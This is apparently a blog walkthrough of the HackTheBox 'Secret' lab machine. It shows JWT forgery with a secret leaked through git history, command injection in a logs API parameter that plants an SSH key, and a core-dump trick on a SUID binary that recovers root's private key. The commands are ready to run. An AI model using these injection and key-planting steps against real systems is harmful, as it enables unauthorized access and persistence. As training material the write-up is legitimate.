---
title: 'HackTheBox | Secret'
aliases: ["/2022/03/26/htb-secret.html"]
date: "2022-03-26T00:00:00Z"
tags: [hackthebox,linux,nodejs,jwt]
categories: [HackTheBox]
cover:
    image: /assets/CTFs/HTB/Secret/infopanel.jpg
---

## Information Gathering

Lets start with enumerating the machine using nmap to find open ports and information about the services running on those.
I used the following command todo so.

```bash
nmap -sC -sV -oN nmap/detailed 10.10.11.120
```

The options I used are: `-sC` to run TCP connection scan, `-sV` to run a service scan, `-oN` to save to file.

```log
Nmap scan report for 10.10.11.120
Host is up (0.031s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 21 20:48:47 2022 -- 1 IP address (1 host up) scanned in 13.33 seconds
```

Port 80 has a nginx server and Port 3000 has a NodeJS express server.
The nginx server may just be a reverseproxy. Going to port 80 and 3000 in a browser we get the same site, this means nginx is probably only running as a reverse proxy. We find a download link on the website with the api sourcecode, lets enumerate and search for vulnerabilities.

### Enumeration - Source Code

First thing I did is list all files in the directory. 

```bash
ls -la
total 119
drwxrwxrwx 1 root root  4096 sep  3  2021 .
drwxrwxrwx 1 root root     0 feb 21 21:06 ..
-rwxrwxrwx 1 root root    72 sep  3  2021 .env
drwxrwxrwx 1 root root  4096 sep  8  2021 .git
-rwxrwxrwx 1 root root   885 sep  3  2021 index.js
drwxrwxrwx 1 root root     0 aug 13  2021 model
drwxrwxrwx 1 root root 40960 aug 13  2021 node_modules
-rwxrwxrwx 1 root root   491 aug 13  2021 package.json
-rwxrwxrwx 1 root root 69452 aug 13  2021 package-lock.json
drwxrwxrwx 1 root root     0 sep  3  2021 public
drwxrwxrwx 1 root root     0 feb 21 22:12 routes
drwxrwxrwx 1 root root     0 aug 13  2021 src
-rwxrwxrwx 1 root root   651 aug 13  2021 validations.js
```

And we notice a few things, this is indeed a NodeJS application. It also contains `.git` folder and there is a `.env` file.
A `.git` folder is what git uses for repo's its essentially where all the commits and changes are stored. A `.env` file is a file where you can place your environment variables, so you can exclude the file before uploading the rest of your source.

Lets also take a look at the endpoints. One of the files looks interesting `/routes/private.js` which contains a entry for `/api/logs`.
It takes a query parameter `?file` and run `git log --oneline` with the parameter `file` appended to it, this can lead us to RCE!
But only the admin (`username: "theadmin"`) can use it.

```js
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```



Another file I notice is `/routes/verifytoken.js` . This is the code that checks our `auth-token` it looks like this is using JWT. 
The verify function doesn't check the algorithm used on the JWT-token. It only specifies the secret to use, this is stored in environment variable `TOKEN_SECRET`.


```js
module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
};
```

Remember that we found that `.env` file? Maybe this contains our `TOKEN_SECRET` variable and we can use it to craft our JWT-token.
Logging the file we see it doesn't contain much information and that the `TOKEN_SECRET` is `secret`. Its likely removed.

```bash
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

If it was ever in there it should be in a git commit, because the folder is a repository. Lets check the logs.

```bash
git log
```

It contains a commit *"removed .env for security reasons"*, lets use `git diff` to check what changed. The commithash associated is `67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78`.
To view changes in a specific commit you can use the following command `git diff COMMIT^!`. The `COMMIT` parameter is a [commit-ish](https://git-scm.com/docs/gitglossary#def_commit-ish).

> A [commit object](https://git-scm.com/docs/gitglossary#def_commit_object) or an [object](https://git-scm.com/docs/gitglossary#def_object) that can be recursively dereferenced to a commit object. The following are all commit-ishes: a commit object, a [tag object](https://git-scm.com/docs/gitglossary#def_tag_object) that points to a commit object, a tag object that points to a tag object that points to a commit object, etc.

This basically means the hash that we just found.
Replacing this with the correct value and this will be the command we need to run.

```bash
git diff de0a46b5107a2f4d26e348303e76d85ae4870934..
```

```diff
diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```

And we see a secret! Now we can use this so sign the JWT-token. The contents of the token will be ``{"name":"theadmin"}``.
I used an online tool to generate the JWT-token and this is my result *eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4ifQ.GDRG1ileUj55S0ZdAAZhtUz28Hz4s7fHgqbiES5Qr7s*

![](/assets/CTFs/HTB/Secret/jwt-generate.png)

Now if we set the `auth-token` header to our generated JWT-token and go to `/api/priv` it shows us that we are the  `"theadmin"`.

```bash
curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4ifQ.GDRG1ileUj55S0ZdAAZhtUz28Hz4s7fHgqbiES5Qr7s' 'http://10.10.11.120/api/priv'
```

## Gaining user

Now that we are the required user we can start exploiting the API. Adding any command to the end of the `?file` parameter will run it. Lets try it with `id`.

```bash
curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4ifQ.GDRG1ileUj55S0ZdAAZhtUz28Hz4s7fHgqbiES5Qr7s' 'http://10.10.11.120/api/logs?file=.env;id'
```

We get command output. `"ab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"`.
Now we can try getting a reverseshell. After playing around a bit to get one working I ended up generating and uploading a sshkey.

```bash
ssh-keygen -t rsa -b 4096 -C 'get@hacked' -f dasith -P ''
```

From the output from `id` we know that the username is `dasith`. Our attackplan is as follows.
1. Make the `.ssh` folder in the home directory if it doesn't exist. *(`mkdir -p /home/dasith/.ssh`)*
2. Write our public key to the `authorized_keys` *(`echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys`)*

First lets store our public key contents into a bash variable `$PUBLIC_KEY`. This will be easier then copying it into the request.

```bash
export PUBLIC_KEY=$(cat dasith.pub)
```

Then running the curl command that "uploads" our public key.

```bash
curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4ifQ.GDRG1ileUj55S0ZdAAZhtUz28Hz4s7fHgqbiES5Qr7s' -G --data-urlencode "file=.env;mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" http://10.10.11.120/api/logs
```
This will be our final command.
What does it do?

- Print Headers
- Use GET
- Send the parameters inside of the query
- Send this command `mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys` where `$PUBLIC_KEY` is replaced with the contents that we already saved to it.

Now we can use our sshkey to login.

```bash
ssh -i dasith dasith@10.10.11.120
```

Now that we are in, we can get the flag!

```bash
cat user.txt 
<REDACTED>
```


## Enumeration

Inside of the `/opt` folder we find a SUID binary **`count`** and its source code.
Looking through the sourcecode I find something interesting.
It contains the following code

```c
prctl(PR_SET_DUMPABLE, 1);
```

This means that when the program crashes it generates a dump file.
We can make the program crash on purpose to leak information that's stored in memory.
Like the file contents! 

## Gaining root

Now we can read any file as root. What next? Well root might have a idrsa file that we can then use to login over ssh.
Our attack steps are as follows.

1. Run the binary.
2. Supply the filename to read (`/root/.ssh/id_rsa`).
3. Background the process (<kbd>Ctrl</kbd> + Z).
4. Get process id using `ps`.
5. Kill the process, with the flag `SIGSEGV`.
6. Foreground process with `fg`.

Lets do it and see if it works.

![](/assets/CTFs/HTB/Secret/coredump-count.png){: .modal}

We succesfully dumped the core. Now we need to retrieve the data inside of the dump.
Start by checking what utility is used to "pack" the data. This is commonly stored in `/proc/sys/kernel/core_pattern`.

```bash
|/usr/share/apport/apport %p %s %c %d %P %E
```

In this case, a crash will be handled by the [Apport](https://wiki.ubuntu.com/Apport) utility.
We can unpack the file using `apport-unpack`, apport by default saves its crashes in `/var/crash`. 
With the following command we unpack it to `/tmp/crashdata`.

```bash
apport-unpack /var/crash/_opt_count.1000.crash /tmp/crashdata
```

Now that we unpacked the crash we can look at the `CoreDump` file located inside of the folder we extracted to.
Lets run strings against it to look for any strings.

![](/assets/CTFs/HTB/Secret/coredump-strings.png){: .modal}


![](/assets/CTFs/HTB/Secret/dump-idrsa.png){: .modal}

And somewhere in there we found our `/root/.ssh/id_rsa` file.
Lets save it to a file `secret.root` and then login with it using ssh.

```bash
chmod 600 secret.root
ssh -i secret.root root@10.10.11.120
```

We got a shell and are logged in as root!
Now we can get the flag and submit it.

![](/assets/CTFs/HTB/Secret/root-flag.png){: .modal}

Of course you would have been able to just get the flag from the coredump method but then you didn't really root the box, only got a way to read files.


## References

- [JWT.io](https://jwt.io/)
- [Understanding core dumps Linux](https://linux-audit.com/understand-and-configure-core-dumps-work-on-linux/)
- [prctl(2) - Linux manual page](https://man7.org/linux/man-pages/man2/prctl.2.html)
- [Apport - Ubuntu Wiki](https://wiki.ubuntu.com/Apport)
